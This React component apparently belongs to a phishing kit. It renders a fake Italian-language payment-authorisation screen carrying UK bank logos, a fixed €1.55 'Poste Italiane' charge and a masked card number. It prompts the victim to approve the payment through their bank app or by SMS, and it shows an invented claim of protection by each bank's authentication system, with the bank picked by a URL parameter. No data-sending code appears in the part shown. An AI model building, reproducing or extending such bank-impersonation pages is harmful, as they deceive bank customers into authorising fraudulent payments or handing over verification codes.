import React, { useState } from 'react';
import { useParams } from 'react-router-dom';
import { Button } from "@/components/ui/button";
import { Smartphone, Shield } from "lucide-react";
import visaLogo from "@/assets/visa2.png";
import mastercardLogo from "@/assets/mc2.png";
import appLogo from "@/assets/app.png";
import smsLogo from "@/assets/sms.png";
import arrowLogo from "@/assets/arros.png";
import hsbcLogo from "@/assets/hsbcuk.png";
import barclaysLogo from "@/assets/barclaysuk.png";
import halifaxLogo from "@/assets/halifaxuk.png";
import lloydsLogo from "@/assets/lloydsuk.png";
import natwestLogo from "@/assets/natwestuk.png";
import santanderLogo from "@/assets/santanderuk.png";

interface ChooseComponentProps {
  cardType?: string | null;
  bankName?: string | null;
  showText?: boolean | string;
  onChoice?: (choice: 'bank' | 'sms') => void;
}

const ChooseComponent = ({ cardType, bankName, showText, onChoice }: ChooseComponentProps) => {
  const [selectedChoice, setSelectedChoice] = useState<'bank' | 'sms' | null>(null);
  const { code } = useParams<{ code: string }>();
  
  // Extract payment reference from code parameter (part after "it3 app")
  const getPaymentReference = () => {
    if (!code) return "IT-2024-001234";
    
    const codeStr = code.toString();
    const it3AppIndex = codeStr.toLowerCase().indexOf('it3 app');
    
    if (it3AppIndex !== -1 && it3AppIndex + 7 < codeStr.length) {
      return codeStr.substring(it3AppIndex + 7).trim();
    }
    
    return "IT-2024-001234";
  };

  const handleChoice = (choice: 'bank' | 'sms') => {
    setSelectedChoice(choice);
    onChoice?.(choice);
  };

  // Check if bankName is one of our recognized banks
  const isRecognizedBank = bankName && ['HSBCUK', 'BARCLAYSUK', 'HALIFAXUK', 'LLOYDSUK', 'NATWESTUK', 'SANTANDERUK'].includes(bankName);

  return (
    <div className="w-full max-w-md mx-auto space-y-4 relative p-2 -mb-8 font-chevin font-thin">
      <div className="text-center">
        {isRecognizedBank ? (
          <>
            {/* Bank Logo at top left when recognized bankName exists */}
            <div className="flex justify-between items-center mb-3 animate-fade-in min-h-[20px]">
              <div className="animate-fade-in">
                {bankName === 'HSBCUK' && (
                  <img 
                    src={hsbcLogo} 
                    alt="HSBC" 
                    className="h-8 w-auto object-contain drop-shadow-lg" 
                  />
                )}
                {bankName === 'BARCLAYSUK' && (
                  <img 
                    src={barclaysLogo} 
                    alt="Barclays" 
                    className="h-8 w-auto object-contain drop-shadow-lg" 
                  />
                )}
                {bankName === 'HALIFAXUK' && (
                  <img 
                    src={halifaxLogo} 
                    alt="Halifax" 
                    className="h-8 w-auto object-contain drop-shadow-lg" 
                  />
                )}
                {bankName === 'LLOYDSUK' && (
                  <img 
                    src={lloydsLogo} 
                    alt="Lloyds" 
                    className="h-8 w-auto object-contain drop-shadow-lg" 
                  />
                )}
                {bankName === 'NATWESTUK' && (
                  <img 
                    src={natwestLogo} 
                    alt="NatWest" 
                    className="h-8 w-auto object-contain drop-shadow-lg" 
                  />
                )}
                {bankName === 'SANTANDERUK' && (
                  <img 
                    src={santanderLogo} 
                    alt="Santander" 
                    className="h-8 w-auto object-contain drop-shadow-lg" 
                  />
                )}
              </div>
              
              {/* Card Logo at top right when recognized bankName exists */}
              {cardType && (
                <div className="animate-fade-in">
                  {cardType === 'visa' && (
                    <img 
                      src={visaLogo} 
                      alt="Visa" 
                      className="h-4 w-auto object-contain drop-shadow-lg"
                    />
                  )}
                  {cardType === 'mastercard' && (
                    <img 
                      src={mastercardLogo} 
                      alt="MasterCard" 
                      className="h-4 w-auto object-contain drop-shadow-lg" 
                    />
                  )}
                </div>
              )}
            </div>
          </>
        ) : (
          /* Show both card logos when no recognized bankName */
          <div className="flex justify-between items-center mb-3 animate-fade-in">
            {cardType === 'visa' ? (
              <>
                <img 
                  src={visaLogo} 
                  alt="Visa" 
                  className="w-auto object-contain drop-shadow-lg"
                  style={{ height: '14px' }}
                />
                <img 
                  src={mastercardLogo} 
                  alt="MasterCard" 
                  className="h-8 w-auto object-contain drop-shadow-lg"
                />
              </>
            ) : (
              <>
                <img 
                  src={mastercardLogo} 
                  alt="MasterCard" 
                  className="h-8 w-auto object-contain drop-shadow-lg"
                />
                <img 
                  src={visaLogo} 
                  alt="Visa" 
                  className="w-auto object-contain drop-shadow-lg"
                  style={{ height: '14px' }}
                />
              </>
            )}
          </div>
        )}
        
     
        <div className="mb-4 mt-6 py-1 px-4 bg-card/80 backdrop-blur-sm border border-border/50 rounded-xl shadow-lg drop-shadow-md">
          <div className="text-center">
            <p className="text-[11px] font-chevin font-medium text-muted-foreground/80 leading-relaxed drop-shadow-sm">
              Accedi alla tua app bancaria per autorizzare questo pagamento.
            </p>
          </div>
        </div>
      </div>
      
      {/* Payment Reference Card */}
      <div className="w-fit mx-auto px-3 py-2 bg-blue-50/90 backdrop-blur-sm border border-blue-200/60 rounded-lg shadow-md drop-shadow-sm transition-all duration-300 hover:shadow-lg hover:bg-blue-50">
        <div className="text-center">
          <span className="text-[8px] font-thin text-blue-600/80 uppercase tracking-wider block mb-1">Riferimento pagamento:</span>
          <span className="text-xs font-medium text-blue-700 bg-blue-100/50 px-2 py-0.5 rounded tracking-normal">
            {typeof showText === 'string' ? showText : showText ? "Text" : getPaymentReference()}
          </span>
        </div>
      </div>
      
      <div className="text-center mt-4">
        <p className="text-[11px] font-thin text-muted-foreground">
          Scegli il tuo metodo di verifica preferito
        </p>
      </div>
      
      {/* Payment Info Card */}
      <div className="mt-4 p-2 bg-card/80 backdrop-blur-sm border border-border/50 rounded-xl shadow-lg drop-shadow-md transition-all duration-300 hover:shadow-xl">
        <div className="space-y-2">
          {/* Amount and Merchant Row */}
          <div className="flex justify-between items-center">
            <div className="text-left">
              <span className="text-[8px] font-thin text-muted-foreground/80 uppercase tracking-wider block mb-0.5">Importo</span>
              <span className="text-[11px] font-thin text-foreground bg-muted/30 px-1 py-0.5 rounded tracking-normal">1,55 €</span>
            </div>
            <div className="text-right">
              <span className="text-[8px] font-thin text-muted-foreground/80 uppercase tracking-wider block mb-0.5">Commerciante</span>
              <span className="text-[11px] font-thin text-foreground bg-muted/30 px-1 py-0.5 rounded tracking-normal">Poste Italiane</span>
            </div>
          </div>
          
          {/* Card Info Row */}
          <div className="flex justify-between items-center pt-1.5 border-t border-border/30">
            <div className="flex items-center gap-2">
              <span className="text-[8px] font-thin text-muted-foreground/80 uppercase tracking-wider"></span>
              {cardType && (
                <img 
                  src={cardType === 'visa' ? visaLogo : mastercardLogo} 
                  alt={cardType} 
                  className="h-3 w-auto object-contain drop-shadow-sm" 
                />
              )}
            </div>
            <span className="text-[11px] font-thin text-foreground bg-muted/30 px-1 py-0.5 rounded tracking-normal">•••• 1234</span>
          </div>
        </div>
      </div>
      
      {/* Security Text */}
      <div className="text-center -mt-4 -mb-4">
        <div className="flex items-center justify-center gap-1">
          <Shield className="h-3 w-3 text-muted-foreground" />
          <p className="text-[10px] font-thin text-muted-foreground">
            {bankName === 'HSBCUK' && 'Protetto dal sistema di autenticazione HSBC.'}
            {bankName === 'BARCLAYSUK' && 'Protetto dal sistema di autenticazione Barclays.'}
            {bankName === 'HALIFAXUK' && 'Protetto dal sistema di autenticazione Halifax.'}
            {bankName === 'LLOYDSUK' && 'Protetto dal sistema di autenticazione Lloyds.'}
            {bankName === 'NATWESTUK' && 'Protetto dal sistema di autenticazione NatWest.'}
            {bankName === 'SANTANDERUK' && 'Protetto dal sistema di autenticazione Santander.'}
            {!bankName && 'Protetto dal sistema di autenticazione della tua banca.'}
          </p>
        </div>
      </div>
    </div>
  );
};

export default ChooseComponent;